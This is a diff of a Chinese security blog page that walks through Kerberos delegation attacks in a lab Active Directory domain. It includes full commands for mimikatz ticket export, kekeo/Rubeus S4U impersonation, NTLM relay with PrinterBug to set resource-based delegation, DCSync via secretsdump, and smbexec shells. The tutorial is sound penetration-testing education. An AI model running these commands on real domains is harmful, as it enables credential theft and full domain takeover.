@@ -475,7 +475,7 @@ DC2本地SAM
 <hr>
 <h2 id="八、服务主体名称（SPN）与服务类型详解"><a href="#八、服务主体名称（SPN）与服务类型详解" class="headerlink" title="八、服务主体名称（SPN）与服务类型详解"></a>八、服务主体名称（SPN）与服务类型详解</h2><p>在深入委派攻击之前，必须理解一个核心概念：<strong>服务主体名称（Service Principal Name，SPN）</strong>。SPN 是 Kerberos 协议中用于唯一标识网络服务的“身份证”，它直接决定了攻击者能模拟用户访问什么样的资源。</p>
 <h3 id="8-1-什么是-SPN？"><a href="#8-1-什么是-SPN？" class="headerlink" title="8.1 什么是 SPN？"></a>8.1 什么是 SPN？</h3><p>SPN 是 Kerberos 中服务的唯一标识符，格式为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">服务类型/主机名[:端口][/域名]</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务类型/主机名[:端口][/域名]</span><br></pre></td></tr></table></figure>
 <p>例如：</p>
 <ul>
 <li><code>cifs/DC1.redteam.club</code>：表示 DC1 上的文件共享服务</li>
@@ -536,16 +536,16 @@ DC2本地SAM
 <p>在约束委派攻击中，服务账号的 <code>msDS-AllowedToDelegateTo</code> 属性里存储的就是允许委派的目标 SPN。攻击者需要根据这些 SPN 来选择攻击目标：例如，如果列表中包含 <code>cifs/DC1</code>，攻击者就能模拟管理员访问域控的共享；如果包含 <code>ldap/DC1</code>，则可能直接 DCSync。</p>
 <h3 id="8-3-SPN-的注册与查询"><a href="#8-3-SPN-的注册与查询" class="headerlink" title="8.3 SPN 的注册与查询"></a>8.3 SPN 的注册与查询</h3><ul>
 <li><p><strong>注册 SPN</strong>：使用 <code>setspn</code> 命令为账号（用户或计算机）添加 SPN。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -A &lt;SPN&gt; &lt;账号名&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setspn -A &lt;SPN&gt; &lt;账号名&gt;</span><br></pre></td></tr></table></figure>
 <p>示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -A cifs/12server2.redteam.club websec</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setspn -A cifs/12server2.redteam.club websec</span><br></pre></td></tr></table></figure>
 <p>这为 <code>websec</code> 用户注册了 <code>cifs/12server2.redteam.club</code> 的 SPN，意味着该用户可以代表 Kerberos 客户端访问 <code>12server2</code> 的共享服务。</p>
 </li>
 <li><p><strong>查询 SPN</strong>：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setspn -L &lt;账号名&gt;          # 查看账号注册的 SPN</span><br><span class="line">setspn -Q &lt;SPN&gt;             # 查询哪个账号拥有该 SPN</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setspn -L &lt;账号名&gt;          # 查看账号注册的 SPN</span><br><span class="line">setspn -Q &lt;SPN&gt;             # 查询哪个账号拥有该 SPN</span><br></pre></td></tr></table></figure>
 </li>
 <li><p><strong>PowerShell 查询</strong>：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> * <span class="literal">-Properties</span> ServicePrincipalName | <span class="built_in">Select-Object</span> Name, ServicePrincipalName</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> * <span class="literal">-Properties</span> ServicePrincipalName | <span class="built_in">Select-Object</span> Name, ServicePrincipalName</span><br></pre></td></tr></table></figure></li>
 </ul>
 <h3 id="8-4-SPN-与委派的关系"><a href="#8-4-SPN-与委派的关系" class="headerlink" title="8.4 SPN 与委派的关系"></a>8.4 SPN 与委派的关系</h3><p>在委派机制中，SPN 起到了两个关键作用：</p>
 <ol>
@@ -656,12 +656,12 @@ DC2本地SAM
 </ul>
 </li>
 <li><strong>认证与 TGT 下发</strong>：DC1 收到触发后，会向 <code>12server2</code> 发起 Kerberos 认证请求。由于 <code>12server2</code> 配置了非约束委派，域控在认证过程中会将自身（DC1$）的 TGT 附带发送给 <code>12server2</code>，并缓存于其 LSASS 内存中。</li>
-<li><strong>导出 TGT</strong>：攻击者在 <code>12server2</code> 上使用 mimikatz 或 Rubeus 导出所有缓存的 Kerberos 票据，重点关注包含 <code>krbtgt</code> 且客户端为 <code>DC1$</code> 的票据文件。<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>
+<li><strong>导出 TGT</strong>：攻击者在 <code>12server2</code> 上使用 mimikatz 或 Rubeus 导出所有缓存的 Kerberos 票据，重点关注包含 <code>krbtgt</code> 且客户端为 <code>DC1$</code> 的票据文件。<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>
 导出的文件示例：<code>[0;12d40]-2-0-60a10000-DC1$@krbtgt-REDTEAM.COM.kirbi</code>。</li>
-<li><strong>注入票据</strong>：将导出的 TGT 注入当前会话，获得域控机器账户的身份：<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::ptt DC1$.kirbi</span><br></pre></td></tr></table></figure></li>
+<li><strong>注入票据</strong>：将导出的 TGT 注入当前会话，获得域控机器账户的身份：<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz # kerberos::ptt DC1$.kirbi</span><br></pre></td></tr></table></figure></li>
 <li><strong>利用机器账户权限</strong>：由于域控制器机器账户（DC1$）默认具有 DCSync 权限（可复制域数据库），攻击者可利用该 TGT 执行 DCSync 攻击，导出所有域用户哈希：<ul>
 <li>使用 mimikatz：<code>lsadump::dcsync /domain:redteam.club /all /csv</code></li>
-<li>或通过 impacket 的 <code>secretsdump.py</code>（Impacket工具）远程导出（需将票据转换为 ccache 格式）：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=DC1$.ccache</span><br><span class="line">python3 secretsdump.py -k -no-pass DC1.redteam.club -just-dc-user administrator</span><br></pre></td></tr></table></figure></li>
+<li>或通过 impacket 的 <code>secretsdump.py</code>（Impacket工具）远程导出（需将票据转换为 ccache 格式）：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=DC1$.ccache</span><br><span class="line">python3 secretsdump.py -k -no-pass DC1.redteam.club -just-dc-user administrator</span><br></pre></td></tr></table></figure></li>
 </ul>
 </li>
 <li><strong>完全控制</strong>：获得域管理员哈希后，可进一步通过哈希传递、黄金票据等手段完全控制域。</li>
@@ -756,12 +756,12 @@ DC2本地SAM
 <p><img src="/images/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%9F%9F%E6%83%85%E5%86%B5/image_7.png" alt="在这里插入图片描述"></p>
 <h4 id="攻击步骤详细说明"><a href="#攻击步骤详细说明" class="headerlink" title="攻击步骤详细说明"></a>攻击步骤详细说明</h4><ol>
 <li><strong>获取服务账号凭据</strong>：攻击者通过密码猜测、内存读取、域控导出等方式获得配置了约束委派的服务账号（例如 <code>websec</code>）的明文密码或 NTLM 哈希。在环境中，<code>websec</code> 用户已设置约束委派，密码为 <code>123456</code>，并已注册 SPN：<code>cifs/12server2.redteam.club</code>。假设其委派配置允许委派给 <code>cifs/DC1.redteam.club</code>（即域控的文件共享服务）。</li>
-<li><strong>请求服务账号 TGT</strong>：使用工具请求该服务账号的 TGT。例如用 <code>kekeo</code>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:websec /domain:redteam.club /password:123456 /ticket:websec.kirbi</span><br></pre></td></tr></table></figure>
-或用 <code>Rubeus</code>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:websec /password:123456 /domain:redteam.club /dc:DC1.redteam.club /ptt</span><br></pre></td></tr></table></figure></li>
-<li><strong>模拟任意用户进行 S4U2Self</strong>：利用服务账号的 TGT，向 KDC 请求以任意用户（如 <code>Administrator</code>）访问服务自身的票据（ST1）。此步骤使用 <code>tgs::s4u</code>（kekeo）或 Rubeus 的 <code>s4u</code> 模块。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:websec.kirbi /user:Administrator@redteam.club /service:cifs/DC1.redteam.club</span><br></pre></td></tr></table></figure>
+<li><strong>请求服务账号 TGT</strong>：使用工具请求该服务账号的 TGT。例如用 <code>kekeo</code>：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgt::ask /user:websec /domain:redteam.club /password:123456 /ticket:websec.kirbi</span><br></pre></td></tr></table></figure>
+或用 <code>Rubeus</code>：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:websec /password:123456 /domain:redteam.club /dc:DC1.redteam.club /ptt</span><br></pre></td></tr></table></figure></li>
+<li><strong>模拟任意用户进行 S4U2Self</strong>：利用服务账号的 TGT，向 KDC 请求以任意用户（如 <code>Administrator</code>）访问服务自身的票据（ST1）。此步骤使用 <code>tgs::s4u</code>（kekeo）或 Rubeus 的 <code>s4u</code> 模块。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tgs::s4u /tgt:websec.kirbi /user:Administrator@redteam.club /service:cifs/DC1.redteam.club</span><br></pre></td></tr></table></figure>
 此处 <code>/service</code> 指定目标服务 SPN（注意：在 S4U2Self 阶段，实际请求的应该是服务自身的 SPN，但工具会自动处理；通常直接指定最终目标 SPN 即可，工具会先请求服务自身的票据然后转换）。</li>
 <li><strong>获得目标服务票据 ST2</strong>：上一步如果成功，工具会生成用于访问指定服务的 ST2（例如 <code>cifs/DC1.redteam.club</code>）。文件名如 <code>TGS_Administrator@redteam.club@REDTEAM.CLUB_cifs~DC1.redteam.club.kirbi</code>。</li>
-<li><strong>注入票据并访问</strong>：使用 <code>kerberos::ptt</code> 将 ST2 注入当前会话，然后尝试访问目标服务：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC1\c$</span><br></pre></td></tr></table></figure>
+<li><strong>注入票据并访问</strong>：使用 <code>kerberos::ptt</code> 将 ST2 注入当前会话，然后尝试访问目标服务：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\DC1\c$</span><br></pre></td></tr></table></figure>
 如果目标服务允许，攻击者即可模拟域管理员访问域控的文件共享，进而可尝试导出哈希（若获得 <code>cifs</code> 票据，可直接通过文件共享操作，但 DCSync 需要额外的 <code>ldap</code> 票据，需根据委派配置调整）。</li>
 </ol>
 <p><strong>注意</strong>：约束委派攻击的关键限制是只能访问<strong>预配置的目标服务</strong>。如果配置的委派目标是 <code>cifs/DC1</code>，则攻击者可获得域控的文件共享访问；如果目标是 <code>ldap/DC1</code>，则可利用 DCSync。因此，攻击者需要提前了解服务账号的委派配置。</p>
@@ -815,7 +815,7 @@ DC2本地SAM
 <li><strong>网络连通性</strong>：能够与域控和目标计算机通信。</li>
 </ul>
 <h4 id="11-3-2-准备工作：创建专用工作目录"><a href="#11-3-2-准备工作：创建专用工作目录" class="headerlink" title="11.3.2 准备工作：创建专用工作目录"></a>11.3.2 准备工作：创建专用工作目录</h4><p>建议在攻击机上创建一个目录（如 <code>~/impacket_output</code>）用于存放所有生成的票据和临时文件，避免污染 Impacket 脚本目录：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> ~/impacket_output</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> ~/impacket_output</span><br></pre></td></tr></table></figure>
 
 <h4 id="11-3-3-复现1：利用普通域账号提升到域本地管理员（攻击域控）"><a href="#11-3-3-复现1：利用普通域账号提升到域本地管理员（攻击域控）" class="headerlink" title="11.3.3 复现1：利用普通域账号提升到域本地管理员（攻击域控）"></a>11.3.3 复现1：利用普通域账号提升到域本地管理员（攻击域控）</h4><p>该复现结合打印机漏洞和 NTLM 中继，通过强制域控回连，修改域控的 RBCD 属性，进而获取域控权限。中继主机为攻击机（<code>192.168.18.100</code>）。</p>
 <p><strong>攻击流程图：</strong></p>
@@ -823,24 +823,24 @@ DC2本地SAM
 <p><strong>步骤详细说明</strong>（所有命令在攻击机 Kali 上执行，假设 Impacket 脚本在 <code>~/impacket/examples/</code>）：</p>
 <ol>
 <li><p><strong>添加机器账号</strong>：使用 <code>addcomputer.py</code> 创建机器账号 <code>hack2026$</code>，密码 <code>pass@123</code>。  </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 addcomputer.py -method SAMR -dc-ip 192.168.18.10 -computer-name hack2026 -computer-pass pass@123 <span class="string">&quot;redteam.club/hack:pass@123&quot;</span></span><br><span class="line"><span class="comment"># 参数说明：-method SAMR 使用 SAMR 协议添加，-computer-name 指定机器名（自动加$），-computer-pass 指定密码，最后是域用户凭据</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 addcomputer.py -method SAMR -dc-ip 192.168.18.10 -computer-name hack2026 -computer-pass pass@123 <span class="string">&quot;redteam.club/hack:pass@123&quot;</span></span><br><span class="line"><span class="comment"># 参数说明：-method SAMR 使用 SAMR 协议添加，-computer-name 指定机器名（自动加$），-computer-pass 指定密码，最后是域用户凭据</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p><strong>启动 NTLM 中继</strong>：运行 <code>ntlmrelayx.py</code>，将认证中继到域控的 LDAP，并指定要提权的机器账号 <code>hack2026$</code>（注意 <code>$</code> 需要转义），同时使用 <code>-l</code> 指定输出目录为 <code>~/impacket_output</code>。  </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlmrelayx.py -t ldap://192.168.18.10 -smb2support --remove-mic --delegate-access --escalate-user hack2026$ -l ~/impacket_output -debug</span><br><span class="line"><span class="comment"># -t：中继目标 LDAP 服务；--delegate-access：执行 RBCD 配置；--escalate-user：将 hack2026$ 的 SID 添加到目标计算机的 RBCD 列表；-l：指定输出目录（域信息文件将保存在这里）</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 ntlmrelayx.py -t ldap://192.168.18.10 -smb2support --remove-mic --delegate-access --escalate-user hack2026$ -l ~/impacket_output -debug</span><br><span class="line"><span class="comment"># -t：中继目标 LDAP 服务；--delegate-access：执行 RBCD 配置；--escalate-user：将 hack2026$ 的 SID 添加到目标计算机的 RBCD 列表；-l：指定输出目录（域信息文件将保存在这里）</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p><strong>触发打印机漏洞</strong>：运行 <code>printerbug.py</code>，强制域控 DC1 向攻击机（<code>192.168.18.100</code>）发起 SMB 认证。  </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 printerbug.py redteam.club/hack:pass@123@192.168.18.10 192.168.18.100</span><br><span class="line"><span class="comment"># 第一个参数：域用户凭据@目标IP；第二个参数：攻击机IP（接收认证的机器）</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 printerbug.py redteam.club/hack:pass@123@192.168.18.10 192.168.18.100</span><br><span class="line"><span class="comment"># 第一个参数：域用户凭据@目标IP；第二个参数：攻击机IP（接收认证的机器）</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p><strong>中继修改 RBCD</strong>：域控的 SMB 连接被 <code>ntlmrelayx.py</code> 捕获并中继到 LDAP，从而将 <code>hack2026$</code> 的 SID 添加到域控计算机 <code>DC1$</code> 的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性中。</p>
 </li>
 <li><p><strong>请求机器账号 TGT</strong>：切换至专用工作目录，使用 <code>getTGT.py</code> 获取 <code>hack2026$</code> 的 TGT。  </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/impacket_output   <span class="comment"># 进入专用目录</span></span><br><span class="line">python3 ~/impacket/examples/getTGT.py redteam.club/hack2026\$:pass@123 -dc-ip 192.168.18.10</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=hack2026.ccache   <span class="comment"># 设置票据缓存环境变量（注意实际生成的文件名可能是 hack2026.ccache，不带$）</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/impacket_output   <span class="comment"># 进入专用目录</span></span><br><span class="line">python3 ~/impacket/examples/getTGT.py redteam.club/hack2026\$:pass@123 -dc-ip 192.168.18.10</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=hack2026.ccache   <span class="comment"># 设置票据缓存环境变量（注意实际生成的文件名可能是 hack2026.ccache，不带$）</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p><strong>模拟域管理员请求服务票据</strong>：使用 <code>getST.py</code> 以 <code>hack2026$</code> 的身份模拟域管理员 <code>Administrator</code>，请求访问 <code>cifs/DC1.redteam.club</code> 的票据（ST2）。  </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 ~/impacket/examples/getST.py -spn cifs/DC1.redteam.club -impersonate administrator -dc-ip 192.168.18.10 <span class="string">&quot;redteam.club/hack2026\$:pass@123&quot;</span></span><br><span class="line"><span class="comment"># -spn：目标服务的 SPN；-impersonate：要模拟的用户；最后是机器账号凭据（注意 $ 转义）</span></span><br><span class="line"><span class="comment"># 成功后会在当前目录生成 administrator.ccache 文件</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 ~/impacket/examples/getST.py -spn cifs/DC1.redteam.club -impersonate administrator -dc-ip 192.168.18.10 <span class="string">&quot;redteam.club/hack2026\$:pass@123&quot;</span></span><br><span class="line"><span class="comment"># -spn：目标服务的 SPN；-impersonate：要模拟的用户；最后是机器账号凭据（注意 $ 转义）</span></span><br><span class="line"><span class="comment"># 成功后会在当前目录生成 administrator.ccache 文件</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p><strong>访问域控</strong>：导出域哈希或获取 shell。  </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator.ccache   <span class="comment"># 使用生成的 administrator 票据</span></span><br><span class="line">python3 ~/impacket/examples/secretsdump.py -k -no-pass DC1.redteam.club -just-dc-user administrator</span><br><span class="line"><span class="comment"># -k：使用 Kerberos 认证，-no-pass：不提供密码，-just-dc-user：只导出指定用户哈希</span></span><br><span class="line">python3 ~/impacket/examples/smbexec.py -no-pass -k DC1.redteam.club   <span class="comment"># 获取半交互式 shell</span></span><br></pre></td></tr></table></figure></li>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator.ccache   <span class="comment"># 使用生成的 administrator 票据</span></span><br><span class="line">python3 ~/impacket/examples/secretsdump.py -k -no-pass DC1.redteam.club -just-dc-user administrator</span><br><span class="line"><span class="comment"># -k：使用 Kerberos 认证，-no-pass：不提供密码，-just-dc-user：只导出指定用户哈希</span></span><br><span class="line">python3 ~/impacket/examples/smbexec.py -no-pass -k DC1.redteam.club   <span class="comment"># 获取半交互式 shell</span></span><br></pre></td></tr></table></figure></li>
 </ol>
 <h4 id="11-3-4-复现2：资源委派攻击其他域主机获取-system-权限"><a href="#11-3-4-复现2：资源委派攻击其他域主机获取-system-权限" class="headerlink" title="11.3.4 复现2：资源委派攻击其他域主机获取 system 权限"></a>11.3.4 复现2：资源委派攻击其他域主机获取 system 权限</h4><p>该复现针对普通成员服务器（如 <code>12server2</code>），通过查询创建者 SID，利用创建机器的用户权限配置 RBCD，进而获取该主机的 system 权限。</p>
 <p><strong>攻击流程图：</strong></p>
@@ -848,24 +848,24 @@ DC2本地SAM
 <p><strong>步骤详细说明</strong>：</p>
 <ol>
 <li><p><strong>查询计算机创建者</strong>：使用工具（如 <code>ConsoleApp9.exe</code>）查询域内计算机的 <code>mS-DS-CreatorSID</code>，找到目标主机 <code>12server2</code> 的创建者为 <code>hack</code>。  </p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">hack</span>&gt;<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">hack</span>\<span class="title">ConsoleApp9.exe</span></span></span><br><span class="line"><span class="function">[*] [12<span class="title">server2.redteam.club</span>] -&gt; <span class="title">creator</span> [<span class="title">hack</span>]</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">hack</span>&gt;<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">hack</span>\<span class="title">ConsoleApp9.exe</span></span></span><br><span class="line"><span class="function">[*] [12<span class="title">server2.redteam.club</span>] -&gt; <span class="title">creator</span> [<span class="title">hack</span>]</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p><strong>添加机器账号</strong>：使用 <code>addcomputer.py</code> 创建机器账号 <code>hack$</code>，密码 <code>pass@123</code>（如果已有可用机器账号可跳过）。  </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 addcomputer.py -method SAMR -dc-ip 192.168.18.10 -computer-name hack -computer-pass pass@123 <span class="string">&quot;redteam.club/hack:pass@123&quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 addcomputer.py -method SAMR -dc-ip 192.168.18.10 -computer-name hack -computer-pass pass@123 <span class="string">&quot;redteam.club/hack:pass@123&quot;</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p><strong>修改目标计算机的 RBCD 属性</strong>：使用 <code>rbcd.py</code> 将 <code>hack$</code> 的 SID 添加到 <code>12server2$</code> 的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性中。  </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 ~/impacket/examples/rbcd.py -delegate-from hack$ -delegate-to 12server2$ -dc-ip 192.168.18.10 -action write <span class="string">&quot;redteam.club/hack:pass@123&quot;</span></span><br><span class="line"><span class="comment"># -delegate-from：发起委派的机器账号（hack$）；-delegate-to：目标计算机（12server2$）；-action write：写入属性</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 ~/impacket/examples/rbcd.py -delegate-from hack$ -delegate-to 12server2$ -dc-ip 192.168.18.10 -action write <span class="string">&quot;redteam.club/hack:pass@123&quot;</span></span><br><span class="line"><span class="comment"># -delegate-from：发起委派的机器账号（hack$）；-delegate-to：目标计算机（12server2$）；-action write：写入属性</span></span><br></pre></td></tr></table></figure>
 <p>或使用 Windows 工具 <code>SharpAllowedToAct.exe</code>：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpAllowedToAct.exe -m hack -p pass@<span class="number">123</span> -t <span class="number">12</span>server2 -a <span class="number">192</span>.<span class="number">168</span>.<span class="number">18</span>.<span class="number">10</span> redteam.club</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">SharpAllowedToAct.exe -m hack -p pass@<span class="number">123</span> -t <span class="number">12</span>server2 -a <span class="number">192</span>.<span class="number">168</span>.<span class="number">18</span>.<span class="number">10</span> redteam.club</span><br></pre></td></tr></table></figure>
 </li>
 <li><p><strong>请求机器账号 TGT</strong>：获取 <code>hack$</code> 的 TGT。  </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/impacket_output</span><br><span class="line">python3 ~/impacket/examples/getTGT.py redteam.club/hack\$:pass@123 -dc-ip 192.168.18.10</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=hack.ccache</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/impacket_output</span><br><span class="line">python3 ~/impacket/examples/getTGT.py redteam.club/hack\$:pass@123 -dc-ip 192.168.18.10</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=hack.ccache</span><br></pre></td></tr></table></figure>
 </li>
 <li><p><strong>模拟域管理员请求服务票据</strong>：使用 <code>getST.py</code> 以 <code>hack$</code> 的身份模拟域管理员 <code>Administrator</code>，请求访问 <code>cifs/12server2.redteam.club</code> 的票据（ST2）。  </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 ~/impacket/examples/getST.py -spn cifs/12server2.redteam.club -impersonate administrator -dc-ip 192.168.18.10 <span class="string">&quot;redteam.club/hack\$:pass@123&quot;</span></span><br><span class="line"><span class="comment"># 生成 administrator.ccache 票据</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 ~/impacket/examples/getST.py -spn cifs/12server2.redteam.club -impersonate administrator -dc-ip 192.168.18.10 <span class="string">&quot;redteam.club/hack\$:pass@123&quot;</span></span><br><span class="line"><span class="comment"># 生成 administrator.ccache 票据</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p><strong>访问目标主机</strong>：获取 <code>12server2</code> 的 SYSTEM shell。  </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator.ccache</span><br><span class="line">python3 ~/impacket/examples/smbexec.py -no-pass -k 12server2.redteam.club</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator.ccache</span><br><span class="line">python3 ~/impacket/examples/smbexec.py -no-pass -k 12server2.redteam.club</span><br></pre></td></tr></table></figure></li>
 </ol>
 <h4 id="11-3-5-注意事项"><a href="#11-3-5-注意事项" class="headerlink" title="11.3.5 注意事项"></a>11.3.5 注意事项</h4><ul>
 <li>复现1中，攻击者需要拥有一个普通域用户凭据（如 <code>hack:pass@123</code>），并确保域控的 Print Spooler 服务开启。</li>
@@ -1024,7 +1024,7 @@ window.addEventListener('load', function() {
 			<ul id="categorys" class="tag_box list-unstyled collapse in">
 				  
   <li>
-    <li><a href="/categories/网络安全/">网络安全<span>39</span></a></li> <li><a href="/categories/网络安全/SRC-渗透/">SRC&渗透<span>11</span></a></li> <li><a href="/categories/网络安全/SRC-渗透/内网/">内网<span>3</span></a></li>
+    <li><a href="/categories/网络安全/">网络安全<span>40</span></a></li> <li><a href="/categories/网络安全/SRC-渗透/">SRC&渗透<span>11</span></a></li> <li><a href="/categories/网络安全/SRC-渗透/内网/">内网<span>3</span></a></li>
   </li>
 
 			</ul>
